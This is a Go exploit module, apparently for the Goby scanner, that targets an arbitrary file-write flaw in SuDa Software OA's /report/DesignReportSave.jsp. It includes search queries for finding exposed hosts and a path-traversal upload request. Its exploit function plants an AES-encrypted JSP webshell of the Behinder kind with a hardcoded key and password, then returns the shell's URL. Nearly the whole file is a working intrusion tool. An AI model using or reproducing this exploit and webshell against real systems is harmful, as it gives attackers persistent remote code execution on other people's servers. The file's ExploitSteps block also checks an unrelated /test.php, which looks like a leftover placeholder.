package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "SuDa Software OA /report/DesignReportSave.jsp File writes Vulnerability",
    "Description": "<p>SuDa Software OA is a complete enterprise business management system, which organically integrates enterprise purchase management, sales management, warehouse management and financial management.</p><p>SuDa Software OA /report/DesignReportSave.jsp If an arbitrary file is written to the interface, an attacker can obtain server privileges by writing malicious files.</p>",
    "Product": "SuperData_Soft-OA",
    "Homepage": "http://www.superdata.com.cn/",
    "DisclosureDate": "2024-03-18",
    "PostTime": "2024-03-20",
    "Author": "兰公子",
    "FofaQuery": "body=\"速达软件技术（广州）有限公司\"",
    "GobyQuery": "body=\"速达软件技术（广州）有限公司\"",
    "Level": "3",
    "Impact": "<p>SuDa Software OA /report/DesignReportSave.jsp If an arbitrary file is written to the interface, an attacker can obtain server privileges by writing malicious files.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability：<a href=\"http://www.superdata.com.cn/\">http://www.superdata.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "default,customize",
            "show": ""
        },
        {
            "name": "customize",
            "type": "input",
            "value": "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>",
            "show": "choose=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/report/DesignReportSave.jsp?report=..%5Ca.jsp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "<% out.println(\"123456\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/report/DesignReportSave.jsp?report=..%5Ca.jsp"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/a.jsp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "123456",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "速达软件OA /report/DesignReportSave.jsp 文件写入漏洞",
            "Product": "速达软件-OA",
            "Description": "<p>速达-OA是一套完整的企业业务管理系统，统有机的将企业进货管理、销售管理、仓储管理、财务管理融为一体。<br></p><p>速达-OA /report/DesignReportSave.jsp 接口处存在任意文件写入，攻击者可通过写入恶意文件获取服务器权限。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.superdata.com.cn/\" target=\"_blank\">http://www.superdata.com.cn/</a><br></p>",
            "Impact": "<p>速达-OA /report/DesignReportSave.jsp 接口处存在任意文件写入，攻击者可通过写入恶意文件获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "SuDa Software OA /report/DesignReportSave.jsp File writes Vulnerability",
            "Product": "SuperData_Soft-OA",
            "Description": "<p>SuDa Software OA is a complete enterprise business management system, which organically integrates enterprise purchase management, sales management, warehouse management and financial management.<br></p><p>SuDa Software OA /report/DesignReportSave.jsp If an arbitrary file is written to the interface, an attacker can obtain server privileges by writing malicious files.<br></p>",
            "Recommendation": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability：</span><a href=\"http://www.superdata.com.cn/\" target=\"_blank\">http://www.superdata.com.cn/</a><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">SuDa Software OA /report/DesignReportSave.jsp&nbsp;</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">If an arbitrary file is written to the interface, an attacker can obtain server privileges by writing malicious files.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			choose := goutils.B2S(ss.Params["choose"])
			customize := goutils.B2S(ss.Params["customize"])
			customize_name := goutils.RandomHexString(16) + ".jsp"
			password := "rebeyond"
			shell_type := "Behinder"

			//构造Post请求
			postRequestConfig := httpclient.NewPostRequestConfig("/report/DesignReportSave.jsp?report=..%5C" + customize_name)
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Data = customize

			//请求
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			// 资源存在
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}

			if choose == "default" {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + customize_name + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + shell_type + "\n"
				return expResult
			}

			expResult.Success = true
			expResult.Output += "文件上传成功：WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + customize_name + "\n"
			return expResult
		},
	))
}
